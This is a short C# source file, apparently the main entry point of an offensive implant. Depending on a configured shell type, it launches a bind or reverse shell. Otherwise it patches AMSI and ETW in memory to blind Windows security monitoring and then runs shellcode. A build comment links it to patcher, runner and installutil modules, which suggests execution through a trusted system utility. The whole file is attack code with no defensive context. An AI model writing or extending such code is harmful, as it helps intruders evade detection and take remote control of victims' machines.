// mcs main.cs patcher.cs utility.cs runner.cs installutil.cs /reference:System.Management.Automation.dll /reference:System.Configuration.Install.dll

public class main
{
    public static void Main()
    {
        if (Uninstaller.shellType == "bind")
            Uninstaller.ExecuteBindShell();
        else if (Uninstaller.shellType == "reverse")
            Uninstaller.ExecuteReverseShell();
        else
        {
            MemoryPatcher.PatchAMSI();
            MemoryPatcher.PatchETW();
            ShellcodeRunner.RunShellcode();
        }
    }
}